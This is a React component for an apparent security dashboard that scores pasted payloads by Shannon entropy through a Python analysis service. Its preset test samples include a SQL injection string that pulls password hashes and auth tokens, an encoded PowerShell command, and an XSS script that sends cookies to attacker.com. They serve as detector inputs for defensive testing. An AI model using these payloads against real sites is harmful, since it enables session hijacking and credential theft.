import React, { useState } from 'react';
import { Cpu, Search, AlertCircle, ShieldAlert, CheckCircle, HelpCircle } from 'lucide-react';
import type { EntropyAnalysisResult } from '../types/telemetry';
import { INTEL_BASE_URL } from '../config';

export const ThreatIntelView: React.FC = () => {
  const [testPayload, setTestPayload] = useState(
    "' UNION SELECT id, password_hash, auth_token FROM users WHERE '1'='1"
  );
  const [analyzing, setAnalyzing] = useState(false);
  const [result, setResult] = useState<EntropyAnalysisResult | null>(null);

  const samplePayloads = [
    {
      title: 'SQLi Query',
      payload: "' UNION SELECT id, password_hash, auth_token FROM users WHERE '1'='1",
    },
    {
      title: 'Normal JSON Payload',
      payload: '{"transactionId": "TX-9901", "entity": "Z-Cloud", "currency": "USD"}',
    },
    {
      title: 'Obfuscated Shellcode',
      payload: 'powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA=',
    },
    {
      title: 'XSS Injection',
      payload: "<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>",
    },
    {
      title: 'Repetitive Buffer Pattern',
      payload: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
    },
  ];

  const handleRunAnalysis = async () => {
    setAnalyzing(true);
    try {
      const res = await fetch(`${INTEL_BASE_URL}/api/analyze`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: testPayload, path: '/api/v1/inspected' }),
      });
      if (res.ok) {
        const data = await res.json();
        setResult(data);
      }
    } catch {
      // Ignore
    } finally {
      setAnalyzing(false);
    }
  };

  return (
    <div className="space-y-4">
      {/* Intro Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <div className="text-xs font-bold text-slate-900 flex items-center space-x-2">
            <Cpu className="h-4 w-4 text-slate-700" />
            <span>Entropy Threat Detection (Python Engine)</span>
          </div>
          <p className="text-[11px] text-slate-500 mt-0.5">
            Calculates Shannon Entropy H(X) to detect obfuscated shellcode, base64 packing, and injection anomalies.
          </p>
        </div>

        <div className="flex items-center space-x-2 px-2.5 py-1 rounded-md bg-white border border-slate-200 text-[11px] font-mono-code text-slate-700 shadow-2xs font-medium">
          <span className="h-2 w-2 rounded-full bg-emerald-500" />
          <span>Python :5050 Online</span>
        </div>
      </div>

      {/* Preset Pill Bar */}
      <div>
        <div className="text-xs font-bold text-slate-700 mb-1.5">
          Test Samples
        </div>
        <div className="flex flex-wrap gap-2">
          {samplePayloads.map((s, idx) => (
            <button
              key={idx}
              onClick={() => setTestPayload(s.payload)}
              className="px-2.5 py-1 rounded-md bg-white hover:bg-slate-50 border border-slate-200 text-xs font-semibold text-slate-700 transition shadow-2xs cursor-pointer"
            >
              {s.title}
            </button>
          ))}
        </div>
      </div>

      {/* Main Analyzer Workbench */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        {/* Left: Payload Input */}
        <div className="lg:col-span-7 light-card rounded-xl p-5 space-y-3.5">
          <div className="text-xs font-bold text-slate-900 flex items-center space-x-2">
            <Search className="h-4 w-4 text-slate-700" />
            <span>Payload Inspector</span>
          </div>

          <textarea
            rows={5}
            value={testPayload}
            onChange={(e) => setTestPayload(e.target.value)}
            className="w-full p-3 rounded-lg bg-slate-50 border border-slate-300 text-xs font-mono-code text-slate-900 focus:outline-none focus:border-slate-500 focus:bg-white"
            placeholder="Enter payload string or packet snippet to analyze..."
          />

          <button
            onClick={handleRunAnalysis}
            disabled={analyzing || !testPayload}
            className="w-full py-2.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-semibold text-xs transition flex items-center justify-center space-x-2 shadow-xs cursor-pointer"
          >
            <Cpu className="h-3.5 w-3.5" />
            <span>{analyzing ? 'Computing Entropy...' : 'Run Entropy Analysis'}</span>
          </button>

          {/* Mathematical Theory Box */}
          <div className="p-3.5 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-600 space-y-1.5">
            <div className="flex items-center space-x-1.5 text-slate-900 font-bold">
              <HelpCircle className="h-3.5 w-3.5 text-slate-600" />
              <span>Shannon Entropy Principle</span>
            </div>
            <p className="leading-relaxed text-[11px] text-slate-600">
              Shannon Entropy measures bit-level randomness: <span className="font-mono-code text-slate-900 font-bold">H(X) = -Σ P(x) log₂(P(x))</span>.
              Standard text & JSON payloads cluster between <span className="text-slate-900 font-mono-code font-bold">2.8 - 4.5</span>.
              Obfuscated or packed payloads typically exceed <span className="text-rose-700 font-mono-code font-bold">4.85</span>, signaling an evasion attempt.
            </p>
          </div>
        </div>

        {/* Right: Results */}
        <div className="lg:col-span-5 light-card rounded-xl p-5 flex flex-col justify-between">
          <div>
            <div className="text-xs font-bold text-slate-900 pb-2 border-b border-slate-100">
              Analysis Output
            </div>

            {result ? (
              <div className="mt-3.5 space-y-3.5">
                {/* Score Meters */}
                <div className="grid grid-cols-2 gap-2.5">
                  <div className="p-3 rounded-lg bg-slate-50 border border-slate-200">
                    <span className="text-[10px] text-slate-500 uppercase font-mono-code block mb-0.5 font-bold">
                      Shannon Entropy
                    </span>
                    <div className="text-2xl font-bold font-mono-code text-slate-900">
                      {result.shannon_entropy}
                    </div>
                    <span className="text-[10px] text-slate-400 font-medium">bits / byte</span>
                  </div>

                  <div className="p-3 rounded-lg bg-slate-50 border border-slate-200">
                    <span className="text-[10px] text-slate-500 uppercase font-mono-code block mb-0.5 font-bold">
                      Risk Score
                    </span>
                    <div
                      className={`text-2xl font-bold font-mono-code ${
                        result.risk_score >= 50
                          ? 'text-rose-600'
                          : result.risk_score >= 20
                          ? 'text-amber-600'
                          : 'text-emerald-600'
                      }`}
                    >
                      {result.risk_score} / 100
                    </div>
                    <span className="text-[10px] text-slate-500 font-medium">{result.classification}</span>
                  </div>
                </div>

                {/* Verdict Badge */}
                <div
                  className={`p-3 rounded-lg border text-xs flex items-center space-x-2 ${
                    result.risk_score >= 50
                      ? 'bg-rose-50 border-rose-200 text-rose-900'
                      : 'bg-emerald-50 border-emerald-200 text-emerald-900'
                  }`}
                >
                  {result.risk_score >= 50 ? (
                    <ShieldAlert className="h-4 w-4 text-rose-600 shrink-0" />
                  ) : (
                    <CheckCircle className="h-4 w-4 text-emerald-600 shrink-0" />
                  )}
                  <div>
                    <div className="font-bold">{result.recommended_action}</div>
                    <div className="text-[10px] opacity-80 font-medium">Edge Decision</div>
                  </div>
                </div>

                {/* Signals List */}
                <div>
                  <div className="text-xs font-bold text-slate-800 mb-1.5">
                    Threat Indicators ({result.anomaly_signals.length})
                  </div>
                  {result.anomaly_signals.length === 0 ? (
                    <div className="p-3 rounded-lg bg-slate-50 text-slate-500 text-xs text-center border border-slate-200">
                      No malicious patterns or anomalies detected.
                    </div>
                  ) : (
                    <div className="space-y-1.5">
                      {result.anomaly_signals.map((sig, idx) => (
                        <div
                          key={idx}
                          className="p-2.5 rounded-lg bg-slate-50 border border-slate-200 text-xs"
                        >
                          <div className="flex items-center justify-between font-mono-code text-[11px] mb-0.5">
                            <span className="text-rose-700 font-bold">{sig.type}</span>
                            <span className="text-[9px] px-1.5 py-0.2 rounded bg-rose-100 text-rose-800 font-bold uppercase">
                              {sig.severity}
                            </span>
                          </div>
                          <p className="text-[11px] text-slate-600">{sig.details}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            ) : (
              <div className="py-20 text-center text-slate-400 flex flex-col items-center justify-center space-y-1.5">
                <AlertCircle className="h-6 w-6 text-slate-300" />
                <span className="text-xs font-medium">Click Run Entropy Analysis to inspect payload.</span>
              </div>
            )}
          </div>

          <div className="mt-3.5 pt-2.5 border-t border-slate-100 text-[11px] text-slate-400 flex justify-between font-medium">
            <span>Python 3.14 Heuristics</span>
            <span className="font-mono-code text-slate-600">:5050 /api/analyze</span>
          </div>
        </div>
      </div>
    </div>
  );
};
